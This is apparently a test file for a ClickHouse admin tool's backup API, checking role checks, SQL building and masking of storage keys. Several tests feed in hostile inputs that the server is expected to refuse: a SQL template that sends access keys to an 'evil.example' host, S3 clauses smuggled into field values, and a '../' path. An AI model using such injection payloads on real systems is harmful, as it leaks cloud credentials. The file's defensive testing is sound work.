// query-backup.test.js - tests the backup requests of /api/query (backup_sp).
// The browser sends fields. The server builds the SQL and adds the storage keys.
// Copyright (C) 2026 Quantrail™ Data Private Limited

import { describe, test, expect, beforeEach, mock } from "bun:test";
import { Database } from "bun:sqlite";
import { drizzle } from "drizzle-orm/bun-sqlite";
import * as schema from "../../src/backend/db/schema.js";
import { initCrypto, encrypt } from "../../src/backend/services/crypto.js";
import { databaseModuleMock } from "../db/databaseModuleMock.js";

const mockExecuteQuery = mock();
const NODE = { name: "h1", host: "h1", port: 8123, user: "service", password: "pw" };

const sqlite = new Database(":memory:");
sqlite.exec(`CREATE TABLE app_setting (
  id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT NOT NULL UNIQUE, value TEXT,
  category TEXT NOT NULL DEFAULT 'general', created_at TEXT, updated_at TEXT
)`);
const testDb = drizzle(sqlite, { schema });

mock.module("../../src/backend/db/index.js", () => databaseModuleMock(testDb, sqlite));
mock.module("../../src/backend/services/clusterUtils.js", () => ({
  getClusterNodes: () => [NODE],
  resolveTargetNode: () => NODE,
  getAllClusters: () => [],
  getClusterById: () => null,
  getNodeByName: () => null,
  getDefaultCluster: () => null,
  saveClusters: () => {},
  migrateClusterData: () => {},
  maskClusterPasswords: (cluster) => cluster,
  MAX_CLUSTERS: 3,
  MAX_TOTAL_NODES: 18,
}));
mock.module("../../src/backend/services/clickhouse.js", () => ({
  executeQuery: mockExecuteQuery,
  executeQueryWithBody: mock(),
}));

initCrypto("test-session-secret-minimum-32-characters-long!");
const { runQuery } = await import("../../src/backend/controllers/query.js");

const AZURE_KEY = "azureSecretKey123==";
sqlite
  .query("INSERT INTO app_setting (key, value, category) VALUES ('backup_profiles', ?, 'backups')")
  .run(
    JSON.stringify([
      {
        id: 1,
        name: "s3",
        type: "s3",
        bucket: "my-bucket",
        endpoint: encrypt("https://s3.example.com"),
        accessKeyId: encrypt("AKIDEXAMPLE"),
        accessKey: encrypt("s3-secret"),
      },
      {
        id: 2,
        name: "azure",
        type: "azure",
        bucket: "my-container",
        accessKeyId: encrypt("myaccount"),
        accessKey: encrypt(AZURE_KEY),
      },
    ]),
  );

function createRes() {
  return {
    statusCode: 200,
    body: null,
    status(code) {
      this.statusCode = code;
      return this;
    },
    json(payload) {
      this.body = payload;
      return this;
    },
  };
}

async function send(body, role = "admin") {
  const res = createRes();
  await runQuery({ user: { role }, body: { node: "h1", clusterId: "c1", backup_sp: true, ...body }, on: () => true }, res);
  return res;
}

function sentSql() {
  return mockExecuteQuery.mock.calls.map((call) => call[0].sql);
}

beforeEach(() => {
  mockExecuteQuery.mockReset();
  mockExecuteQuery.mockResolvedValue({ rows: [], columns: [], stats: {} });
});

describe("backup requests", () => {
  test("refuses the old SQL template, so no other SQL gets the keys", async () => {
    const res = await send({
      sql: "1-//-SELECT '<accessKeyId>', '<accessKey>' FROM url('http://evil.example/', 'CSV', 'a String')",
    });
    expect(res.statusCode).toBe(400);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("refuses a backup request from an editor", async () => {
    const res = await send({ backup: { action: "backup", profileId: 1 } }, "editor");
    expect(res.statusCode).toBe(403);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("refuses unsafe fields before it runs anything", async () => {
    const res = await send({
      backup: { action: "backup", profileId: 1, scope: "database", database: "x TO S3('http://evil/')" },
    });
    expect(res.statusCode).toBe(400);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("refuses SQL in SETTINGS", async () => {
    const res = await send({
      backup: { action: "backup", profileId: 1, settings: "base_backup = S3('http://evil/', 'a', 'b')" },
    });
    expect(res.statusCode).toBe(400);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("gives 404 for an unknown storage profile", async () => {
    const res = await send({ backup: { action: "backup", profileId: 99 } });
    expect(res.statusCode).toBe(404);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("builds an S3 backup and writes its manifest", async () => {
    const res = await send({ backup: { action: "backup", profileId: 1, scope: "database", database: "sales" } });
    expect(res.statusCode).toBe(200);
    const [backupSql, manifestSql] = sentSql();
    expect(backupSql).toMatch(
      /^BACKUP DATABASE sales TO S3\('https:\/\/s3\.example\.com\/my-bucket\/backups\/manual\/DATABASE\/sales\/MANUAL_sales__[0-9_]+\/', 'AKIDEXAMPLE', 's3-secret'\)$/,
    );
    expect(manifestSql).toStartWith("INSERT INTO FUNCTION s3('https://s3.example.com/my-bucket/backups/manual/DATABASE/sales/");
    expect(res.body.backup_id).toStartWith("manual/DATABASE/sales/MANUAL_sales__");
    expect(JSON.stringify(res.body)).not.toContain("s3-secret");
  });

  test("builds an Azure restore with the account key", async () => {
    const res = await send({
      backup: { action: "restore", profileId: 2, scope: "all", backupId: "manual/ALL/MANUAL_ALL__1", async: true },
    });
    expect(res.statusCode).toBe(200);
    expect(sentSql()).toEqual([
      `RESTORE ALL FROM AzureBlobStorage('https://myaccount.blob.core.windows.net', 'my-container', 'backups/manual/ALL/MANUAL_ALL__1/', 'myaccount', '${AZURE_KEY}') ASYNC`,
    ]);
  });

  test("scans Azure manifests with azureBlobStorage", async () => {
    mockExecuteQuery.mockResolvedValue({ rows: [{ _path: "p", data: "{}" }], columns: [] });
    const res = await send({ backup: { action: "list", profileId: 2, pattern: "manual/ALL/*/manifest.json" } });
    expect(res.statusCode).toBe(200);
    expect(res.body.rows).toEqual([{ _path: "p", data: "{}" }]);
    expect(sentSql()).toEqual([
      `SELECT _path, data FROM azureBlobStorage('https://myaccount.blob.core.windows.net', 'my-container', 'backups/manual/ALL/*/manifest.json', 'myaccount', '${AZURE_KEY}', 'RawBLOB', 'auto', 'data String') LIMIT 500`,
    ]);
  });

  test("refuses a scan pattern that is not a manifest", async () => {
    const res = await send({ backup: { action: "list", profileId: 2, pattern: "../secret.db" } });
    expect(res.statusCode).toBe(400);
    expect(mockExecuteQuery).not.toHaveBeenCalled();
  });

  test("masks the Azure key in a ClickHouse error", async () => {
    mockExecuteQuery.mockRejectedValue(new Error(`Code: 499. Failed for key ${AZURE_KEY}`));
    const res = await send({ backup: { action: "backup", profileId: 2 } });
    expect(res.statusCode).toBe(400);
    expect(res.body.error).toBe("Code: 499. Failed for key ***");
  });

  test("masks the key in a manifest error and keeps the backup result", async () => {
    mockExecuteQuery
      .mockResolvedValueOnce({ rows: [{ id: "x", status: "BACKUP_CREATED" }], columns: [] })
      .mockRejectedValueOnce(new Error(`write failed AccountKey=${AZURE_KEY}`));
    const res = await send({ backup: { action: "backup", profileId: 2 } });
    expect(res.statusCode).toBe(200);
    expect(res.body.rows).toEqual([{ id: "x", status: "BACKUP_CREATED" }]);
    expect(res.body.manifest_error).toBe("write failed AccountKey=***");
  });
});
